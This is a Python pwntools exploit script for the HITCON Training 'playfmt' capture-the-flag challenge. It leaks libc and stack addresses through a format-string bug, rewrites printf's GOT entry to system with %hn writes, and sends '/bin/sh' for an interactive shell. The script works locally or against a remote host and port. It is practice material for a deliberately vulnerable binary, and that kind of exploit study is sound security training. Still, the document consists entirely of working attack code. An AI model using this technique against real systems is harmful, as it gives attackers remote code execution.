#!/usr/bin/env python3
"""HITCON Training playfmt; adapted for local-first use.
Reference: https://github.com/Yeuoly/buuctf_pwn/tree/master/hitcontraining_playfmt
Provide the exact i386 libc used by the challenge: LIBC=/path/to/libc.so.6.
"""
from pathlib import Path
from pwn import *

HERE = Path(__file__).resolve().parent
context.arch = "i386"
elf = ELF(str(HERE / "hitcontraining_playfmt"), checksec=False)
libc_path = args.LIBC or str(HERE / "libc.so.6")
if not Path(libc_path).is_file():
    raise SystemExit("Provide matching i386 libc with LIBC=/path/to/libc.so.6")
libc = ELF(libc_path, checksec=False)
io = remote(args.HOST, int(args.PORT)) if args.REMOTE else process(str(elf.path))

def leak_after(marker=b",,,"):
    io.recvuntil(marker)
    return int(io.recvn(10), 16)

def write_hn(address, value, arg):
    value &= 0xffff
    io.send((f"%{address & 0xffff}c%6$hnEND").encode())
    io.recvuntil(b"END")
    io.send((f"%{value}c%{arg}$hnEND").encode())
    io.recvuntil(b"END")

io.recvuntil(b"\n=====================\n")
io.send(b"%15$p,,,%6$p")
libc_base = leak_after() - libc.sym["__libc_start_main"] - 247
frame = leak_after() - 0x10
system = libc_base + libc.sym["system"]
log.info("libc base: %#x; leaked frame: %#x", libc_base, frame)

# Repoint argument 10 through the saved frame slots to printf@GOT.
write_hn(frame - 4, elf.got["printf"], 10)
write_hn(frame + 4, elf.got["printf"] + 2, 10)
lo, hi = system & 0xffff, (system >> 16) & 0xffff
if lo <= hi:
    payload = f"%{lo}c%5$hn%{hi-lo}c%7$hnEND"
else:
    payload = f"%{hi}c%7$hn%{lo-hi}c%5$hnEND"
io.send(payload.encode())
io.recvuntil(b"END")
io.send(b"/bin/sh\x00")
io.interactive()
